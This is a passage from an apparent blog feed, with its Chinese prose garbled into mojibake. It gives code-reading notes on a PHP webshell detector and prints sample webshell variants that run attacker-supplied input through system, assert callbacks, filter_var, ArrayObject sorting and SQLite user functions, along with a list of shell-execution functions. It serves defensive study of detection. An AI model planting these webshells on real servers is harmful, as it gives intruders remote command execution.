æ‰§è¡Œçš„éšæ‚£'</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Eval : EvalNode   processè°ƒç”¨hasDynamicExpr()å‡½æ•°æ£€æµ‹$node-&gt;exprã€‚</p>
</li>
<li><p>Extends: Class_   process</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">($node)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ($node-&gt;extends <span class="keyword">instanceof</span> Node &amp;&amp; <span class="keyword">$this</span>-&gt;isName($node-&gt;extends)) &#123;</span><br><span class="line">          $className = $node-&gt;extends-&gt;toLowerString();</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> (in_array($className, array_map(<span class="string">'strtolower'</span>, <span class="keyword">$this</span>-&gt;dangerClassName))) &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;storage-&gt;danger($node, <span class="keyword">__CLASS__</span>, <span class="string">'ä»£ç ç»§æ‰¿äº†ä¸å®‰å…¨çš„ç±»'</span>);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ£€æµ‹ ç±»çš„ç»§æ‰¿  ReflectionFunction</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;?php class test extends ReflectionFunction &#123;&#125; </span><br><span class="line">  $f &#x3D; new test(&#39;system&#39;); </span><br><span class="line">$f-&gt;invoke($_POST[2333]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>FilterVar: ç»“ç‚¹ funccall   funcname : filterã€filter_var  ,ç„¶åprocess </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  filter_var($_REQUEST[<span class="string">'pass'</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'assert'</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]), <span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="keyword">array</span>(<span class="string">'filter'</span> =&gt; FILTER_CALLBACK, <span class="string">'options'</span> =&gt; <span class="string">'assert'</span>)));</span><br></pre></td></tr></table></figure>
</li>
<li><p>Include : èŠ‚ç‚¹  Include  ï¼Œè¿›è¡Œprocess()å‡½æ•°ï¼Œé¦–å…ˆé€’å½’æ‰¾$node-&gt;expr  åˆ†ä¸¤ç±»ï¼ˆConcat  -å­—ç¬¦ä¸²ã€Encapsed â€“<strong>ä¸çŸ¥</strong> ï¼‰ç„¶ååˆ¤æ–­æœ€åçš„èŠ‚ç‚¹ï¼Œè‹¥æ–‡ä»¶åä¸ä¸ºphp inc å°±æŠ¥dangerï¼Œç„¶åhasdynamicExpr($nodd-&gt;expr),è¿”å›çœŸ æŠ¥danger.</p>
</li>
<li><p>MbPregExec : æ£€æµ‹è¿™ç±»å˜å½¢webshellï¼Œ<img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20200414171305419.png" alt="image-20200414171305419"></p>
<p>èŠ‚ç‚¹ï¼š FuncCallï¼Œç„¶åè‹¥å‡½æ•°åä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">'mb_ereg_replace'</span>,</span><br><span class="line">    	<span class="string">'mbereg_replace'</span>,</span><br><span class="line">      <span class="string">'mb_eregi_replace'</span>,</span><br><span class="line">      <span class="string">'mberegi_replace'</span>,</span><br><span class="line">      <span class="string">'mb_regex_set_options'</span>,</span><br><span class="line">    <span class="string">'mbregex_set_options'</span>,</span><br></pre></td></tr></table></figure>

<p> ä¸Šé¢è¿™äº›å‡½æ•°ï¼Œå°±æ‰§è¡Œprocess()å‡½æ•°ï¼Œå…ˆè·å¾—å‚æ•°ï¼Œç„¶åå¯¹å‚æ•°è¿›è¡Œæ£€æµ‹ã€‚è‹¥å‚æ•°ä¸ä¸ºå­—ç¬¦ä¸²ï¼ŒæŠ¥danger,è‹¥å‚æ•°ä¸ºeï¼Œåˆ™æŠ¥dangerã€‚</p>
</li>
<li><p>MethodCallback: æ£€æµ‹ä¸‹é¢è¿™ç±»webshell , èŠ‚ç‚¹  MethodCall</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// way 0</span></span><br><span class="line">  $arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line">  $arr-&gt;uasort(<span class="string">'assert'</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// way 1</span></span><br><span class="line">  $arr = <span class="keyword">new</span> ArrayObject(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">  $arr-&gt;uksort(<span class="string">'assert'</span>);</span><br><span class="line">  </span><br><span class="line">  $e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">  $db = <span class="keyword">new</span> PDO(<span class="string">'sqlite:sqlite.db3'</span>);</span><br><span class="line">  $db-&gt;sqliteCreateFunction(<span class="string">'myfunc'</span>, $e, <span class="number">1</span>);</span><br><span class="line">  $sth = $db-&gt;prepare(<span class="string">"SELECT myfunc(:exec)"</span>);</span><br><span class="line">  $sth-&gt;execute(<span class="keyword">array</span>(<span class="string">':exec'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]));</span><br><span class="line">  </span><br><span class="line">  $e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line">  $db = <span class="keyword">new</span> SQLite3(<span class="string">'sqlite.db3'</span>);</span><br><span class="line">  $db-&gt;createFunction(<span class="string">'myfunc'</span>, $e);</span><br><span class="line">  $stmt = $db-&gt;prepare(<span class="string">"SELECT myfunc(?)"</span>);</span><br><span class="line">  $stmt-&gt;bindValue(<span class="number">1</span>, $_REQUEST[<span class="string">'pass'</span>], SQLITE3_TEXT);</span><br><span class="line">$stmt-&gt;execute();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/17/chip%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/51631434650097.png" alt="img"></p>
<p>ä¹‹åè·å¾—æ–¹æ³•åï¼Œå¦‚ä¸ºä¸‹é¢çš„åç§°ï¼Œæ‰§è¡Œprocess()å‡½æ•°ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &#39;uasort&#39;                   </span><br><span class="line">  &#39;uksort&#39;                   </span><br><span class="line">  &#39;set_local_infile_handler&#39; </span><br><span class="line">  &#39;sqlitecreateaggregate&#39;   </span><br><span class="line">  &#39;sqlitecreatecollation&#39;   </span><br><span class="line">  &#39;sqlitecreatefunction&#39;     </span><br><span class="line">  &#39;createcollation&#39;         </span><br><span class="line">  &#39;fetchall&#39;                 </span><br><span class="line">&#39;createfunction&#39;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆï¼Œè‹¥æ–¹æ³•åä¸ºfetchallï¼Œå…ˆçœ‹å‚æ•°æ˜¯å¦æœ‰ <code>...</code>è¿™ç§å½¢å¼ï¼Œè‹¥æœ‰æŠ¥danger;ç„¶åæ£€æŸ¥fetchAll()çš„å‰ä¸¤ä¸ªå‚æ•°ï¼Œè‹¥é€šè¿‡ç™½åå•æ£€æµ‹è·³è¿‡ï¼Œå¦åˆ™è°ƒç”¨hasDynamicExpr()æ£€æŸ¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œè‹¥çœŸæŠ¥dangerï¼Œè‹¥ç¬¬äºŒä¸ªå‚æ•°ä¸ä¸ºåŒ¿åå‡½æ•°æŠ¥warningã€‚</p>
<p>ä¹‹åæ£€æµ‹å…¶ä»–å‡½æ•°é¦–å…ˆæ£€æµ‹æŒ‡å®šä½ç½®å‰çš„å‚æ•°æ˜¯å¦å­˜åœ¨å˜é•¿å‚æ•°ï¼Œè‹¥å­˜åœ¨æŠ¥dangerï¼›ç„¶åæ£€æµ‹æŒ‡å®šä½ç½®çš„å‚æ•°å€¼æ˜¯å¦å«æœ‰åŠ¨æ€æ€§ï¼Œè‹¥æœ‰åˆ™æŠ¥dangerï¼›è‹¥æŒ‡å®šä½ç½®çš„å‚æ•°å€¼ä¸ä¸ºåŒ¿åå‡½æ•°æŠ¥warningã€‚</p>
</li>
<li><p>PregExec:  èŠ‚ç‚¹ funccall  ,è‹¥å‡½æ•°åä¸ºpreg_replaceæˆ–preg_filterï¼Œå°±æ‰§è¡Œprocess()å‡½æ•°ï¼Œæ£€æµ‹ç¬¬ä¸€ä¸ªå‚æ•°ä¸­æ˜¯å¦æœ‰eï¼Œè‹¥æœ‰åˆ™æŠ¥danger</p>
</li>
<li><p>Reflection: æ£€æµ‹èŠ‚ç‚¹ New  ,ç„¶åè·å–$node-&gt;class;ï¼Œè‹¥åç§°åœ¨ä¸‹åˆ—ä¸­ï¼ŒæŠ¥warningã€‚reflectionclass-&gt;getDocComment()å¯ä»¥è·å–æ³¨é‡Šã€‚reflectionfunctin-&gt;invokeargs()æ‰§è¡Œå‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &#39;ReflectionClass&#39;,</span><br><span class="line">  &#39;ReflectionZendExtension&#39;,</span><br><span class="line">  &#39;ReflectionExtension&#39;,</span><br><span class="line">  &#39;ReflectionFunction&#39;,</span><br><span class="line">  &#39;ReflectionFunctionAbstract&#39;,</span><br><span class="line">  &#39;ReflectionMethod&#39;,</span><br><span class="line">&#39;ReflectionGenerator&#39;, &#x2F;&#x2F;&#x2F;å’Œextendä¸­ä¸€æ ·</span><br></pre></td></tr></table></figure>
</li>
<li><p>ScriptTag: æ£€æµ‹<code>&lt;script&gt;</code>æ ‡ç­¾å‹webshellï¼ŒæŠ¥warningï¼ˆä¸åˆ¤æ–­ä»£ç å†…å®¹ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  object(PhpParser\Node\Stmt\InlineHTML)#1124 (2) &#123;</span><br><span class="line">    [&quot;value&quot;]&#x3D;&gt;</span><br><span class="line">    string(46) &quot;&lt;script language&#x3D;&quot;php&quot;&gt;</span><br><span class="line">echo 2222;</span><br><span class="line">&lt;&#x2F;script&gt;&quot;</span><br><span class="line">    [&quot;attributes&quot;:protected]&#x3D;&gt;</span><br><span class="line">    array(5) &#123;</span><br><span class="line">      [&quot;startLine&quot;]&#x3D;&gt;</span><br><span class="line">      int(1)</span><br><span class="line">      [&quot;startFilePos&quot;]&#x3D;&gt;</span><br><span class="line">      int(0)</span><br><span class="line">      [&quot;hasLeadingNewline&quot;]&#x3D;&gt;</span><br><span class="line">      bool(true)</span><br><span class="line">      [&quot;endLine&quot;]&#x3D;&gt;</span><br><span class="line">      int(3)</span><br><span class="line">      [&quot;endFilePos&quot;]&#x3D;&gt;</span><br><span class="line">      int(45)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; Chip\Alarm Object</span><br><span class="line">        (</span><br><span class="line">            [type] &#x3D;&gt; ScriptTag</span><br><span class="line">            [level] &#x3D;&gt; WARNING</span><br><span class="line">            [message] &#x3D;&gt; ä½¿ç”¨ä¸æ”¯æŒçš„PHPæ ‡ç­¾ï¼Œå¯èƒ½å­˜åœ¨å®‰å…¨é—®é¢˜</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>shellFunction: åŒassertï¼Œåªæ˜¯å°†æ£€æµ‹çš„å‡½æ•°åå˜ä¸º</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &#39;system&#39;,</span><br><span class="line">   &#39;shell_exec&#39;,</span><br><span class="line">   &#39;exec&#39;,</span><br><span class="line">   &#39;passthru&#39;,</span><br><span class="line">   &#39;popen&#39;,</span><br><span class="line">&#39;proc_open&#39;,</span><br></pre></td></tr></table></figure>

<ul>
<li><p>shell: èŠ‚ç‚¹ä¸º  ShellExec  ï¼Œç„¶ååŒshellfunction</p>
</li>
<li><p>StaticCallback: æ£€æµ‹phar:webphar ã€closure::fromcallable ï¼›èŠ‚ç‚¹ ä¸º StaticCallï¼Œè‹¥{$node-&gt;class-&gt;toLowerString()}::{$node-&gt;name-&gt;toLowerString()}ä¸ºphar:webphar ã€closure::fromcallableï¼Œæ‰§è¡Œprocess()å‡½æ•°ï¼Œè‹¥å‚æ•°<code>...</code>æŠ¥dangerï¼Œæ£€æµ‹å‚æ•°åŠ¨æ€æ€§ï¼Œè‹¥æœ‰åŠ¨æ€æ€§æŠ¥danger,è‹¥æœªä½¿ç”¨åŒ¿åå‡½æ•°ï¼ŒæŠ¥warning.</p>
</li>
</ul>
</li>
</ul>
<h1 id="0x04-è¸©å‘"><a href="#0x04-è¸©å‘" class="headerlink" title="0x04 è¸©å‘"></a>0x04 è¸©å‘</h1><ol>
<li><p>Symfonyå‘½ä»¤è¡Œå¤„ç†</p>
<p>ç”¨äº†applicationçš„run()æ–¹æ³•ï¼Œè‹¥ä¸ä¼ å‚æ•°ä¼šè°ƒç”¨ArgvInputç±»ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArgvInput</span> <span class="keyword">extends</span> <span class="title">Input</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $tokens;</span><br><span class="line">    <span class="keyword">private</span> $parsed;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|null           $argv       An array of parameters from the CLI (in the argv format)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> InputDefinition|null $definition A InputDefinition instance</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $argv = null, InputDefinition $definition = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === $argv) &#123;</span><br><span class="line">            $argv = $_SERVER[<span class="string">'argv'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// strip the application name</span></span><br><span class="line">        array_shift($argv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;tokens = $argv;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">parent</span>::__construct($definition);</span><br><span class="line">    &#125;</span><br><span class="line">..................</span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[argv]</code>åœ¨cliæ¨¡å¼ä¸­ï¼Œä¸ºè¾“å…¥çš„ä¸œè¥¿ï¼Œ<code>$argv=$_SERVER[argv]</code> ,$argv[0]æ˜¯è„šæœ¬åï¼Œ$argv[1]æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å¦‚(â€“11=2)ï¼Œä¾æ¬¡ç±»æ¨ã€‚</p>
<blockquote>
<p>arguments   ls -l  /   æœ‰ä¸¤ä¸ªarguments  -l  /  </p>
<p>A parameter is an argument that provides information to either the command or one of its options</p>
<p>option   å¯¹argumentsçš„ç»†åˆ†   -  æˆ– â€“ </p>
</blockquote>
</li>
<li><p>php-di</p>
<p><a href="https://blog.csdn.net/soonfly/article/details/52627683" target="_blank" rel="noopener">ä¾èµ–æ³¨å…¥å‚è€ƒé“¾æ¥</a>    php-di æ–‡æ¡£<a href="https://link.jianshu.com/?t=http%3A%2F%2Fphp-di.org%2Fdoc%2Fgetting-start" target="_blank" rel="noopener">http://php-di.org/doc/getting-start</a></p>
<p>åˆ†ä¸º æ„é€ å‡½æ•°  æ–¹æ³•  å±æ€§   phpå›è°ƒæ³¨å…¥ </p>
<blockquote>
<h3 id="3-Create-the-objects"><a href="#3-Create-the-objects" class="headerlink" title="3. Create the objects"></a>3. Create the objects</h3><p>ï¼ˆåˆ›å»ºå¯¹è±¡ï¼‰<br>Without PHP-DI, we would have to â€œwireâ€ the dependencies manually like this:<br>ï¼ˆå¦‚æœæ²¡æœ‰PHP-DIï¼Œæˆ‘ä»¬å°†ä¸å¾—ä¸åƒè¿™æ ·æ‰‹åŠ¨åœ°â€œè¿æ¥â€ä¾èµ–é¡¹:ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$userManager = <span class="keyword">new</span> UserManager($mailer);</span><br></pre></td></tr></table></figure>

<p>Instead, we can let PHP-DI figure out the dependencies:<br>ï¼ˆç›¸åï¼Œæˆ‘ä»¬å¯ä»¥è®©PHP-DIè®¡ç®—å‡ºä¾èµ–é¡¹:ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userManager = $container-&gt;get(<span class="string">'UserManager'</span>);</span><br></pre></td></tr></table></figure>

<p>Behind the scenes, PHP-DI will create both a Mailer object and a UserManager object.<br>ï¼ˆåœ¨å¹•åï¼ŒPHP-DIå°†åˆ›å»ºä¸€ä¸ªMailerå¯¹è±¡å’Œä¸€ä¸ªUserManagerå¯¹è±¡ã€‚ï¼‰</p>
</blockquote>
</li>
<li><p>php  Trait</p>
<p>ä»£ç å¤ç”¨ï¼šå®ä¾‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> SayWorld &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::sayHello();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();<span class="comment">//Hello World!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>









</li>
</ol>
<h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<p>PHPåŠ¨æ€ç‰¹æ€§çš„æ•æ‰ä¸é€ƒé€¸</p>
]]></content>
      <tags>
        <tag>Chip</tag>
      </tags>
  </entry>
  <entry>
    <title>é•¿äº­å…¬å¼€è¯¾ç¬”è®°</title>
    <url>/2020/04/13/%E9%95%BF%E4%BA%AD%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">è¾“å…¥å¯†ç ï¼ŒæŸ¥çœ‹æ–‡ç« ã€‚</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="bebe2d2a62ba3dfda79d573e501e72308a2f6fc8b95872413dc6f075b9cf41ff">cccc15989bed4e5058499a08fac419d46b500cfff8f585b1cedb30f4ac9262168ec50e44f160a7d15b3a2ed6dc4114f847c0e1eeb63a84ac045055f68e67cfbb5c2cc640ddb1f9e81f843edbc45dfeecb1c9c0b1e233cc888f0143f0197762cf2985f725d10c43a8b41536f2819f4b1d6a306893aa528a57213698971df78c33d59e1efd61d4a58f9d4ba84d0a6c8ef46b5277860a20b4eeb94438664f724859c80252d75924e29ce29c748176d21912d217ecf58c9752662340c130a1a5b2778590f5e687e1fe18c00572bdbb1fe4f131935c9244868eeb1381ca72ce53aeb6608607278fde9f0430e70d8340a014dc33f4e031b92ad4371de11f51cb308f1897c9272201e790056767cbd8640d7abd542925ab57f66702d4d3f9aa6feb31b38b96a063e1d9f61b997955a6cdb54e418d8adce8ec127eccd65ecc9542e8f4b2c20ce0de3a52d835f95e9116b80718813f874d695397946989c9e219505214f2c733b2b6fe61081cec588267cc463f642a3a2d469e296c642fa8696f3fa3051dcd6e139db43de4ac4585e740cb3ab7f5ddb543dec2b04f788d911741e3211cb585b250c899ae762649e13447b033f6d8d321b969d197b449f0c8786a038cc18031ac35309618303f17f7575710889197b61a2c3424c4889c2c9154d3d8ddd932e41c4e7febbd84c338e08257d8493727bbbe2b3db6ba3c8aee038d33d43fd409c65c2e7147e5a65413be26b17ee122f34f503a676b2c52b0c42e9af41cd0ac9be9f80f1133edc78a8d50b5dce4aa63db8c7121fe757bd77721339dcb6abb5e141c0592d276b2defa5c12c344e1834ba478394619068a4bd0e971ddbf9d1087f800767ce6ca90fdb45655173bb823d90eff3456c8423db9715723ebfc26511cfc84e50cb957ce4d1b4fa7fe0d2fdf1c62c94a7511f43f5631f3c5039cd8dc39da47a0b601e871c5297e7d074086bb6a74158878058268a6175b24ee6fb5a15c1aff8bd95756856799457c53e41d1d119709a66da621b21949edfb6242ac5409cac23101562243d5de887fc6fb97a8e94200f5cf3843fefb36a578b140051c27cdd8a975fedb1cdacaa452dd49d759164e446b4b7cc8c673da9039ac3a8a73a5d748c536284de1a9e1aeff8a332c76122a05b2f81ff1f43f1a066ea7ff99ce8d2cd224cee6ab58397795c41b1175a7d364c951de9722ea9890f0bd29e112dc649ac0629b5ebaaa43818b8dab62046dde574ddce86ffe6d86af3b1904835661727e0822fc4c6bce37491fdc0750f431ccb732d820483be43220e4e84c7449d3d898dc5a2ec9442969b7da3ed66da932050173b8c15e13940e440da47f00e714e0ba10f191a2771840f403cd4fc286f814a551882b0f5f5ba9d28095beb78669fb9f66d9d6eca75bb7b6abec389bc64146d6b050cb096f1f51d901508ff0ab982ddc7d9a860dc2e81d1b6736c1aafaed6ecfef520e876ec93f4831f08319e29b59a5e38507c101d86e041df39c529c5cb1dce2ce8db680c51914fb6cfce6c6ca2d9de632981f6771f8bc9d12af5487139d5905cd07da995f971433015ca25cecebe3e93b507a85eecdbaa9e263f65e2dcef206768afeb02b792d5136beb3c81e84a8eea279d699f6dd39c6371633245b4daa2cebf0cd5f34b75e77e2ba17bc8cb2272135bbd5fa621959cd6ec0f06ce1a6ae86d926c349fbe64640fc3896ce05ef6d2fa56e2380cef934b6f2dd648c90e915600513c8a04142372520341f61e9dfae98ed399d34e63f3e1d95fcc9b66730df0923ee03e85a06a747319f1f8afe0f8247869b55a686719340282fab7a6882c4955fc1c26e88ca7d578a816d58c9dbda988cb568447dfec39690739fb7c8e11937dc161e58453a6d3a5aad8cd55b4245e23e02a5c279e0b0dde161205ce152ee0c596704c7eeeb7a563ea4c0af4d7c7e81e6debc311bafaf06f83fa3caf53ce25f76aa8f8f9b49694cbe330add2bb0c55bf0b313029534ba55843bfb921b16aac895acc7bd266c490be6d270acdd2be085b71c8a1278a07a6ae455d441843aa6337ebc6e8f677fab1f57c06d9bd7867c4f3a0bc56a245062b1a3cd70262b85bdc6af5c92e438a68044ba09ef9b80bda2d57b7378bead78e2f5ebc74c0a09bf1ca6b9018d2a163760add4e6c24703f5ecaa71c8fb600f1a44dab11b5ba1a5a9dd82d1e07641f605777d369604ce887ad03211d8b2e5d2a2764ca93530e08e9334fca27fa855d58b1bb39f899672f8aa99be748557a4144c7735386e79cbfa7af195cdbe131cb7a66f3e44644525d16542807e9531de2cbba2258ad0c856a0375e795fff83cca2861330ea9a64c1e06f068e2c6a649c76fe346ebf9692fedd7ed63eadc8c092b25f7034cc6e39323417d1918319319e7ae628e5d06e08e2f7c8e4ec9b293b9c4a65468d583bb0c01bee0df57093b85214f31f9a292069ec74382365e1567a9bc9a5432d23a6c82294d4d8a40dc6a394ed5a8830c05c2dcb4ae77aac040d1c0a5db2b894caa47ea8ca0a383e7aee1ef47631ff6e22d4fc5c42963e93a2ebcbc88b3c20c2e238b6c1d14fc08c88488b3d51d632f5c09af2850a522837469bd03670bf2d53a9389132214843a0f3a2faf8a5114d34ffce9a06a263100018831cbcc714ed5df1df89956f9698151912cd85fb8e87d42d1bc611105c597a1c69b22600db22df495763e9880d548cb534c37c3977a4f7547d9c6cc89443ab6204a4d6791d8fddbc8c304f0458dc1a64a3b125c19cb90c2a0d2a53c6fab82c862b1854540f6ccaddcc07f0cd6040b93eb18f9f7434e71e166d5c0254de48f6aa23c2a6e258558b817a8cf195608e8e04b11d956d0611a2ef3e4398e70c26b7d7987ef9a497f8c4667f6fa6dc560d4e51f0ff821364d9f0844d3e3a5e07cb16488571877f0b7487aa35eb720ee86e570dc250f85d95f35dfd90c5b98b8cd5682b0d7025c89375e308f4db4a3e662c5444db417e97790e21fc4ac871adf91b6cb0746f03dae16d2feb86b79bea8bd09797203883fa9bf80e23e0c9ad6dc0d4c30697947c2c5881c394fa8c721d3199732c4d649d014dcea7b3cd118dde5d490c4be75424ee49e2bcc6f0f31b25d45261b3a4f435061fd9260d1c851fb15b4b7bb300a15573df59b6cc5aa2cdf596af909ec31580aa364e45a9a6e17078a120f377d45f3d7c2df3768f4561b2c72a790e9c04f8dc3cb2004a8ca49476e4a156a77eea06f1988b684fab18ade0cbe4148a946940fadce352af6cd372eb34729c5b23befb7861995482de866ce02d9aa2c5eeed70b2433c887b0385847da5d745e88c876b21f3644d3a459b4856ce24a304560c136ea85764662bea459090ede0311e1134247af30d44803130b9204e45db50f4eb57291081fbac84b92ebff61b0f8dbbabc90b47352e8748d8c3aa7e101760a953a3b8464cf2b3cece4780cff4f3e6aadfae309eff70002c2967b7f0c5276e7af2741c1e2c3411732ef67ba0a41b590bf3e62cba5118de87ab26040dadb53bbf556c7ef1078a4053084525af96318b49fe8fee625d2bd579880da588a3e638483dcb29d2db946835eafa734a7db4d6aa55e8eff90a2d0a6aa511e6f986c4c24656092e967875084c1c1c86b19b5dbf360b0ac47f4093821c8d14637530adcfb374548ad2ded41d67a891408d7f30f9f3aab5d53e3e1283eead07c58d6cd81e005900ec8166323e9a56535ea5221d8ba3a6e76de861085edaa4a0a352dd6ccebf3f0cce7bd95f3b59f1aab981ee0c86030b9d4c48e0eb33d49dcb4de613d59e577ecfa9e86faef165e82b83184bbaefbf492dffee241163ab2c39dd840ccbc7d703c514abfa5a62be7941c301730f2f371c8470bc039afd5196bd68cc92f51531f7a47eda2f57b1c392a07a40cd8717ef7bc4e6e0094df1995cb1b10f99557cf9166ce126158738fdff3cd9ae1d3b5e106a9946288a0d59699b64d0448f3d10ec14490573ea0d9d40d8a9c24d18b622443b2fb6ce74bab6d948cdb62428ab5da9fe3942227fada4d0a15dd873e1f55a442729530e29abaa4582ff9f4b2e7aabc71428337522a3d52830d2c018147615b9c9e978b27fcff6ed4d1da1890a423a2144fb315dcc9997af87d69d372d76ee30ad80f1c1d193bc2e08e505031bc91d940f386b233f6b26254c63492a85f259c6a2aa72accef4fc344e6e0ca32dd0b348917774291eeb620d9b0dd0464085f7a319d02c417b609d71bff4ce6415e9395132fec751a616fc35df8e97e73508006d409c69ebe7f5bbeabd1f2a4e85147f8f6c78a1afeb57289e87b104f7eefd718b67271f8683fbf2c697ca5d8036cd3eff8d3222ce77d6f8613ddbd19209a2e588f06a00385ab5d274576ae664c37b47dd05754c807a2931155819f677fd0f82f1a01484d6256445add9fa3b58ce51a587eb0d6ba1ea7c27a9de4054a4cb06fc70b4fd9be73a754655e9901f37a0d7c1c43e2de946d8de20afd6e9c057a7bb0bc985208f05f3210ae528098cdfc5b67a82aa2f38f9f85d360db2e9c9fa8f353cca00382ce7e10802a08dcc9ee20d9f6f0977b7fee968c13ee5a41651686c50181b87f4760c702b81fbda012ce13588ac0af98d083b149c4360f80f27845018249a40f5c4e9fb1e1382f127bd4187a3e6e9cda3f1019fd017de3ce9d508fd9ef035555c9bff7275da2cedebc6a3325745635c4f210a181e02b42511106b77cb82f78813b9739131f520d78259f9c435503ae879c6fa1e64e57940905cd0d9ac2051d720109385a02b0066baf4413387c23b72e60b108122da49813a2fc843c3360d8284b8f91ebc2ceccb223cd65ea63bc142225b4b887f91bf755ad14e52b45330f734cec5fd0cd9da00ed449bbd541e4ff5ee9e37698c74b5a13ff08c7ce6db8e188af48d4907bce4b9bfb732ea7790cb89fe73479c6a5ee2aa07860a01bdac887e19f8c33b791c12d415680363c7a5bd884507d37a2e8e7f100c9266365f309cb44365f0d8d4fe8270e6a9ffd2ddaaa12e1db54dc6341086c